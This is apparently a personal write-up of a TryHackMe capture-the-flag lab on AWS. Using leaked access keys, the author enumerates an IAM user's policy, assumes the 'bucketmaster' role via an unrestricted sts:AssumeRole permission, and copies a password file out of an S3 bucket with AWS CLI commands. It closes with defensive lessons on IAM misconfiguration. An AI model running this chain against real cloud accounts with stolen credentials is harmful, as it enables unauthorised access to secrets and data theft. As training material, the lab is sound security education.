# AWS Security - S3cret Santa (Advent of Cyber 2025, Day 23)

- **Platform:** TryHackMe
- **URL:** https://tryhackme.com/room/cloudenum-aoc2025-y4u7i0o3p6
- **Date started:** 2026-09-14
- **Date completed:** 2026-09-14
- **Difficulty:** Easy
- **Time spent:** ~30 min

## Summary

AWS IAM enumeration and privilege escalation via `sts:AssumeRole`. Starting from a set of leaked AWS access keys (identity `sir.carrotbane`) found on a compromised desktop, enumerate the attached IAM policy, discover an unrestricted `sts:AssumeRole` permission, assume a more privileged role (`bucketmaster`), and use its S3 access to read a secrets bucket.

## Recon

- Lab access: browser-based AttackBox with AWS CLI pre-installed (no VPN/network target — this room is entirely AWS API-driven).
- Leaked credentials configured via `aws configure`.

```
$ aws sts get-caller-identity
{
    "UserId": "wh5fxe6ba37d5macwv70",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/sir.carrotbane"
}
```

- `aws iam list-attached-user-policies --user-name sir.carrotbane` → no managed policies attached.
- `aws iam list-user-policies --user-name sir.carrotbane` → one inline policy: `SirCarrotbanePolicy`.

Inline policy contents (`aws iam get-user-policy`):

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "ListIAMEntities",
            "Effect": "Allow",
            "Action": [
                "iam:ListUsers", "iam:ListGroups", "iam:ListRoles",
                "iam:ListAttachedUserPolicies", "iam:ListAttachedGroupPolicies", "iam:ListAttachedRolePolicies",
                "iam:GetUserPolicy", "iam:GetGroupPolicy", "iam:GetRolePolicy",
                "iam:GetUser", "iam:GetGroup", "iam:GetRole",
                "iam:ListGroupsForUser", "iam:ListUserPolicies", "iam:ListGroupPolicies", "iam:ListRolePolicies",
                "sts:AssumeRole"
            ],
            "Resource": "*"
        }
    ]
}
```

Key finding: `sir.carrotbane` has only read/list IAM permissions directly, but also has **`sts:AssumeRole` on `Resource: "*"`** — i.e. permission to attempt to assume *any* role in the account, gated only by each role's own trust policy.

`aws iam list-roles` revealed a single role, `bucketmaster`, whose trust policy explicitly allows `sir.carrotbane` to assume it:

```json
"AssumeRolePolicyDocument": {
    "Statement": [{
        "Effect": "Allow",
        "Action": "sts:AssumeRole",
        "Principal": {"AWS": "arn:aws:iam::123456789012:user/sir.carrotbane"}
    }]
}
```

## Exploitation

1. Assumed the role:
   ```
   aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name bucketmaster-session
   ```
2. Exported the returned temporary `AccessKeyId` / `SecretAccessKey` / `SessionToken` as environment variables to act as `bucketmaster`.
3. Confirmed the new identity: `arn:aws:sts::123456789012:assumed-role/bucketmaster/bucketmaster-session`.
4. `aws s3 ls` as `bucketmaster` revealed two buckets: `easter-secrets-123145` and `bunny-website-645341`.
5. `aws s3 ls s3://easter-secrets-123145 --recursive` listed `cloud_password.txt` and `groceries.txt`.
6. Downloaded and read the secret: `aws s3 cp s3://easter-secrets-123145/cloud_password.txt .`

## Privilege Escalation

N/A — role assumption chain (`sir.carrotbane` → `bucketmaster`) *was* the privilege escalation; no OS-level priv esc involved.

## Flags

- Flag: `THM{more_like_sir_cloudbane}`

## Tools & Techniques Used

- AWS CLI (`aws iam`, `aws sts`, `aws s3`)
- IAM policy/trust policy review
- Temporary credential (STS) role assumption

## Lessons Learned

- `sts:AssumeRole` with `Resource: "*"` on a user policy is a red flag even if every other permission looks read-only — it means the *real* boundary of what that user can reach is defined by every role's trust policy in the account, not by the user's own policy.
- Enumeration order that generalizes to other cloud engagements: confirm identity → list own attached/inline policies → read policy documents in full (not just names) → look specifically for `sts:AssumeRole`/`iam:PassRole`-style escalation primitives → enumerate roles and their trust policies for ones your identity can assume.
- Practical AWS CLI note: use `--no-cli-pager` (or `export AWS_PAGER=""`) up front — the default pager (`less`) truncates output in non-interactive/copy-paste workflows.
